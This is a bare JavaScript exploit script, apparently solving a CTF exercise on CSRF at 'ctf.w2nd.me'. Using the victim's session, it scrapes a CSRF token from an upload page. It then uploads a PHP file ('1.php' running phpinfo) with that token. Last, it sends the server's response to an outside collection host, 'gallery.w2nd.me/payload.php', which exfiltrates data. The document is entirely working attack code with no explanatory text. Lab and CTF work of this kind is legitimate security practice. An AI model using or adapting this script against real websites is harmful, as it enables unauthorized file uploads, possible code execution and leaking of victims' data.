 var test;
function submitRequest1(){
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://ctf.w2nd.me/csrf/practice3/upload.php", true);
xhr.withCredentials = true;
xhr.onreadystatechange = CallbackFun;
xhr.send();
function CallbackFun(){
    if (xhr.readyState==4 && xhr.status==200){
    text = xhr.responseText;
    //console.log(text); 
    var re =new RegExp('value="(.*?)"');
    var result= re.exec(text); 
    csrf_token = result[1]; 
    console.log(csrf_token); 
    submitRequest2();
    }
}
}
function submitRequest2()
{
    function CallbackFun2(){
    if (xhr.readyState==4 && xhr.status==200){
        window.text = xhr.responseText;
        // alert(text);

        submit(text);
    }
}
console.log(csrf_token);
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://ctf.w2nd.me/csrf/practice3/upload.php", true);
xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8");
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryrYYLq4HkfCAAYZXe");
xhr.withCredentials = true;
var body = "------WebKitFormBoundaryrYYLq4HkfCAAYZXe\r\n" + 
    "Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\n" + 
    "Content-Type: text/php\r\n" + 
    "\r\n" + 
    "\x3c?php phpinfo(); ?\x3e\r\n" + 
    "------WebKitFormBoundaryrYYLq4HkfCAAYZXe\r\n" + 
    "Content-Disposition: form-data; name=\"csrf-token\"\r\n" + 
    "\r\n" + 
    csrf_token +"\r\n" + 
    "------WebKitFormBoundaryrYYLq4HkfCAAYZXe--\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
xhr.onreadystatechange = CallbackFun2;
xhr.send(new Blob([aBody]));
}

function submit(text){
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET","http://gallery.w2nd.me/payload.php?c="+text);
    xhr2.onreadystatechange=undefined;
    xhr2.send();
}

submitRequest1();